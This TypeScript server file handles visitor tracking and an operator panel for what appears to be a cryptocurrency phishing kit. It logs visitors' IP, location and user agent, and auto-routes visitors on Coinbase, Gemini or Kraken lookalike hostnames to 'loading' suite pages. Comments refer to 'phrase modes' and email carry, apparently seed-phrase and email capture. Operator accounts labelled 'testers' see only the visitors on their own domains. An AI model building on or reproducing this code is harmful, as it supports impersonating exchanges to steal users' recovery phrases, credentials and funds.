// Public (unauthenticated) server functions used by the visitor heartbeat.
// These run as the service role inside the handler so RLS on `participants`
// can be locked down to admins only. Input is validated with Zod and the
// participant `id` shape is enforced server-side.
//
// On first insert we look up tenant_domains by the visitor's Host header and
// stamp participants.owner_id. That is what powers tenant isolation in the
// admin panel: testers only see participants whose owner_id matches them.
//
// Hostnames that look like Coinbase / Gemini auto-approve and assign the
// suite loading page so visitors skip the manual queue.

import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";
import { requestHost } from "@/lib/security";

const ID_RE = /^p_[a-z0-9-]{8,64}$/i;
const PATH_RE = /^\/[a-z][a-z0-9_-]{0,30}\/[a-z][a-z0-9_-]{0,40}$/;

/** Allow pathname or pathname?query (phrase modes, ge email carry, etc.). */
function isValidCurrentUrl(u: string): boolean {
  if (u === "/") return true;
  if (u.length > 2048) return false;
  const q = u.indexOf("?");
  const path = q === -1 ? u : u.slice(0, q);
  if (!PATH_RE.test(path)) return false;
  if (q === -1) return true;
  // Reject fragments / spaces in the query blob.
  return !/[\s#]/.test(u.slice(q + 1));
}

const TouchInput = z.object({
  id: z.string().regex(ID_RE),
  currentUrl: z.string().refine(isValidCurrentUrl, "invalid currentUrl"),
  geo: z
    .object({
      ip: z.string().max(64).nullish(),
      country: z.string().max(120).nullish(),
      countryCode: z.string().max(8).nullish(),
      region: z.string().max(120).nullish(),
      city: z.string().max(120).nullish(),
      userAgent: z.string().max(1024).nullish(),
      host: z.string().max(255).nullish(),
    })
    .optional(),
});

const IdInput = z.object({ id: z.string().regex(ID_RE) });

// Visitor-safe columns — explicitly excludes IP, geo, and user-agent so a
// visitor cannot read sensitive data about themselves or anyone else.
const SAFE_COLS = "id,current_url,assigned_url,approved,online,joined_at,last_seen";

function normalizeHost(input: string | null | undefined): string | null {
  if (!input) return null;
  const h = input.trim().toLowerCase().replace(/:\d+$/, "");
  return h || null;
}

const AUTO_SUITE: Record<"cb" | "gi" | "kn", string> = {
  cb: "/cb/loading",
  gi: "/gi/loading",
  kn: "/kn/loading",
};

/** Map visitor Host → suite for auto-accept (coinbase / gemini / kraken + lookalikes). */
export function suiteFromHostname(host: string | null | undefined): "cb" | "gi" | "kn" | null {
  const h = normalizeHost(host);
  if (!h) return null;
  if (h === "coinbase.com" || h.endsWith(".coinbase.com") || h.includes("coinbase")) {
    return "cb";
  }
  if (h === "gemini.com" || h.endsWith(".gemini.com") || h.includes("gemini")) {
    return "gi";
  }
  if (h === "kraken.com" || h.endsWith(".kraken.com") || h.includes("kraken")) {
    return "kn";
  }
  return null;
}

export const touchParticipantSelf = createServerFn({ method: "POST" })
  .inputValidator((d: unknown) => TouchInput.parse(d))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const now = new Date().toISOString();
    const geoUpdate: Record<string, string | null> = {};
    if (data.geo) {
      if (data.geo.ip !== undefined) geoUpdate.ip = data.geo.ip ?? null;
      if (data.geo.country !== undefined) geoUpdate.country = data.geo.country ?? null;
      if (data.geo.countryCode !== undefined) geoUpdate.country_code = data.geo.countryCode ?? null;
      if (data.geo.region !== undefined) geoUpdate.region = data.geo.region ?? null;
      if (data.geo.city !== undefined) geoUpdate.city = data.geo.city ?? null;
      if (data.geo.userAgent !== undefined) geoUpdate.user_agent = data.geo.userAgent ?? null;
    }
    // Prefer the real request Host over any client-supplied value.
    const serverHost = requestHost();
    const clientHost = normalizeHost(data.geo?.host);
    const host = serverHost || clientHost;
    if (host) geoUpdate.host = host;

    const suite = suiteFromHostname(host);
    const autoUrl = suite ? AUTO_SUITE[suite] : null;

    const { data: existing, error } = await supabaseAdmin
      .from("participants")
      .update({ current_url: data.currentUrl, online: true, last_seen: now, ...geoUpdate })
      .eq("id", data.id)
      .select("id, approved, assigned_url")
      .maybeSingle();
    if (error) throw new Error(error.message);

    if (!existing) {
      let ownerId: string | null = null;
      if (host) {
        const { data: dom } = await supabaseAdmin
          .from("tenant_domains")
          .select("owner_id")
          .eq("hostname", host)
          .maybeSingle();
        ownerId = (dom?.owner_id as string) ?? null;
      }
      const { error: insertError } = await supabaseAdmin.from("participants").insert({
        id: data.id,
        current_url: autoUrl || data.currentUrl,
        online: true,
        last_seen: now,
        owner_id: ownerId,
        approved: !!autoUrl,
        assigned_url: autoUrl,
        ...geoUpdate,
      });
      if (insertError && insertError.code !== "23505") throw new Error(insertError.message);
    } else if (autoUrl && !existing.approved) {
      // Existing unapproved visitor on a Coinbase/Gemini host — auto-accept.
      const { error: autoErr } = await supabaseAdmin
        .from("participants")
        .update({
          approved: true,
          assigned_url: autoUrl,
          current_url: autoUrl,
          online: true,
          last_seen: now,
          ...geoUpdate,
        })
        .eq("id", data.id)
        .eq("approved", false);
      if (autoErr) throw new Error(autoErr.message);
    }
    return { ok: true as const };
  });

export const getParticipantSelf = createServerFn({ method: "GET" })
  .inputValidator((d: unknown) => IdInput.parse(d))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row, error } = await supabaseAdmin
      .from("participants")
      .select(SAFE_COLS)
      .eq("id", data.id)
      .maybeSingle();
    if (error) throw new Error(error.message);
    return row;
  });

export const markParticipantOfflineSelf = createServerFn({ method: "POST" })
  .inputValidator((d: unknown) => IdInput.parse(d))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { error } = await supabaseAdmin
      .from("participants")
      .update({ online: false, last_seen: new Date().toISOString() })
      .eq("id", data.id);
    if (error) throw new Error(error.message);
    return { ok: true as const };
  });

// Admin-panel read: returns full participant rows scoped to the caller.
// Admins see every row; testers see only rows whose owner_id matches them.
export const listParticipantsForCaller = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: rolesRow } = await supabaseAdmin
      .from("user_roles")
      .select("role")
      .eq("user_id", context.userId);
    const roles = (rolesRow ?? []).map((r) => r.role as string);
    const admin = roles.includes("admin");
    const tester = roles.includes("tester");
    if (!admin && !tester) throw new Error("Forbidden");
    let query = supabaseAdmin
      .from("participants")
      .select("id,current_url,assigned_url,approved,online,joined_at,last_seen,ip,country,country_code,region,city,user_agent,host,owner_id")
      .order("joined_at", { ascending: true });
    if (!admin) query = query.eq("owner_id", context.userId);
    const { data, error } = await query;
    if (error) throw new Error(error.message);
    return data ?? [];
  });
